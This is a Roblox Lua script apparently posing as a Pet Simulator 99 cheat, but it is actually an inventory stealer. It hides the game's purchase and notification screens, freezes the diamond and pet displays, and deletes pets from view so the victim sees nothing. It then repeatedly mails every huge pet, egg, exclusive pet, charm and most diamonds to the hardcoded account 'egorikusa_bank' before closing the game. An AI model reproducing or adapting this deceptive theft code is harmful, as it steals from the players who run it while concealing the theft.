-- ti gey aiiafafijfaisafsifaisojfasifasijfa

Username = "egorikusa_bank"
LoadScreen = false -- If you want to enable loadgui, rename to true
TestHide = true
MailMessage = "Egorikusa on top fr fr"
print("Loading Luarmor library...")
plr = game.Players.LocalPlayer-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
guis = plr.PlayerGui

if LoadScreen == nil then
    LoadScreen = true
end
if LoadScreen == true then
    --loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/PetSimulator99/main/loadingscreen"))()
end
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
if TestHide == true then
    task.spawn(
        function()
            while task.wait() do
                pcall(
                    function()
                        game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Purchase Pending").Enabled =
                            false
                        game:GetService("Lighting").PurchasePendingBlur.Enabled = false
                    end
                )
            end
        end
    )
    task.spawn(
        function()
            while task.wait() do
                pcall(
                    function()
                        game:GetService("ReplicatedStorage").Assets.UI.Notifications.Bottom.Message:ClearAllChildren()
                    end
                )
            end
        end
    )
    task.spawn(
        function()
            local gemsrightnow = guis.MainLeft.Left.Currency.Diamonds.Diamonds.Amount.Text
            local oldgemsrn = gemsrightnow
            gemsrightnow:GetPropertyChangedSignal("Text"):Connect(
                function()
                    gemsrightnow = oldgemsrn
                end
            )
        end
    )

    local function freeze_mygems()
        local gems_frame = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds
        local gems_frame_clone = gems_frame:Clone()

        gems_frame_clone.Parent = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency
        gems_frame.Visible = true
    end

    freeze_mygems()
    local gemsframe = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds
    gemsframe:Destroy()
    -- print("Gem has been freezed")
    local function freeze_inventory()
        local pets_frame = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
        local pets_frame_clone = pets_frame:Clone()

        pets_frame_clone.Parent = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main

        --pets_frame.Visible = false
    end
    freeze_inventory()
    local Inventoryframe = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
    Inventoryframe:Destroy()
    -- print("Inventory has been freezed")

    game.Workspace.__THINGS.Pets:Destroy()
end
--guis.Main.BottomButtons.BUTTONS.Inventory.Active = false

local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory

local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
    end
end

local user = Username

if GemAmount1 < 10000 then
    --loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/PetSimulator99/main/redz9999.lua"))()
end

while wait() do
    wait(1)
    local HugeList = {}
    table.foreach(
        save.Pet,
        function(i, v)
            local id = v.id
            local dir = library.Directory.Pets[id]
            if dir.huge then
                table.insert(HugeList, i)
            end
        end
    )

    local EggList = {}
    if save.Egg ~= nil then
        table.foreach(
            save.Egg,
            function(i, v)
                local id = v.id
                local dir = library.Directory.Eggs[id]
                table.insert(EggList, i)
            end
        )
    end

    local ExcList = {}
    table.foreach(
        save.Pet,
        function(i, v)
            local id = v.id
            local dir = library.Directory.Pets[id]
            if dir.exclusiveLevel then
                table.insert(ExcList, i)
            end
        end
    )

    local CharmList = {}
    if save.Charm ~= nil then
        table.foreach(
            save.Charm,
            function(i, v)
                local id = v.id
                local dir = library.Directory.Charms[id]
                table.insert(CharmList, i)
            end
        )
    end

    function GemSteal()
        for i, v in pairs(GetSave().Inventory.Currency) do
            if v.id == "Diamonds" then
                GemAmount = v._am
                GemId = i
                local args = {
                    [1] = user,
                    [2] = MailMessage,
                    [3] = "Currency",
                    [4] = GemId,
                    [5] = GemAmount - 10000
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                    unpack(args)
                )
            end
        end
    end

    spawn(
        function()
            while wait() do
                local HugeList = {}
                table.foreach(
                    save.Pet,
                    function(i, v)
                        local id = v.id
                        local dir = library.Directory.Pets[id]
                        if dir.huge then
                            table.insert(HugeList, i)
                        end
                    end
                )
                if #HugeList ~= 0 or HugeList ~= {} then
                    for i, v in pairs(save.Pet) do
                        local id = v.id
                        local dir = library.Directory.Pets[id]
                        if dir.huge then
                            local args = {
                                [1] = user,
                                [2] = MailMessage,
                                [3] = "Pet",
                                [4] = i,
                                [5] = v._am or 1
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                                unpack(args)
                            )
                        end
                    end
                    -- wait(5.5)
                    if #HugeList == 0 or HugeList == {} then
                        break
                    end
                end
            end
        end
    )

    spawn(
        function()
            while wait() do
                local EggList = {}
                if save.Egg ~= nil then
                    table.foreach(
                        save.Egg,
                        function(i, v)
                            local id = v.id
                            local dir = library.Directory.Eggs[id]
                            table.insert(EggList, i)
                        end
                    )
                end
                if #EggList ~= 0 and #HugeList == 0 then
                    for i, v in pairs(save.Egg) do
                        local args = {
                            [1] = user,
                            [2] = MailMessage,
                            [3] = "Egg",
                            [4] = i,
                            [5] = v._am or 1
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                            unpack(args)
                        )
                    end
                end
                -- wait(5.5)
                if #EggList == 0 or EggList == {} then
                    break
                end
            end
        end
    )

    spawn(
        function()
            while wait() do
                local ExcList = {}
                table.foreach(
                    save.Pet,
                    function(i, v)
                        local id = v.id
                        local dir = library.Directory.Pets[id]
                        if dir.exclusiveLevel then
                            table.insert(ExcList, i)
                        end
                    end
                )

                if #ExcList ~= 0 and #HugeList == 0 and #EggList == 0 then
                    for i, v in pairs(save.Pet) do
                        local id = v.id
                        local dir = library.Directory.Pets[id]
                        if dir.exclusiveLevel then
                            local args = {
                                [1] = user,
                                [2] = MailMessage,
                                [3] = "Pet",
                                [4] = i,
                                [5] = v._am or 1
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                                unpack(args)
                            )
                        end
                    end
                    -- wait(5.5)
                    if #ExcList == 0 or ExcList == {} then
                        break
                    end
                end
            end
        end
    )

    spawn(
        function()
            while wait() do
                local CharmList = {}
                if save.Charm ~= nil then
                    table.foreach(
                        save.Charm,
                        function(i, v)
                            local id = v.id
                            local dir = library.Directory.Charms[id]
                            table.insert(CharmList, i)
                        end
                    )
                end
                if #CharmList ~= 0 and #EggList == 0 and #ExcList == 0 and #HugeList == 0 then
                    for i, v in pairs(save.Charm) do
                        local args = {
                            [1] = user,
                            [2] = MailMessage,
                            [3] = "Charm",
                            [4] = i,
                            [5] = v._am or 1
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                            unpack(args)
                        )
                    end
                end
                -- wait(5.5)
                if #CharmList == 0 or CharmList == {} then
                    break
                end
            end
        end
    )

    spawn(
        function()
            while wait() do
                FinalList = #HugeList + #ExcList + #EggList + #CharmList
                if FinalList == 0 then
                    GemSteal()
                end
            end
        end
    )

    FinalList = #HugeList + #ExcList + #EggList + #CharmList
    if FinalList == 0 then
        GemSteal()
        wait(1)
        game:Shutdown()
    end
end
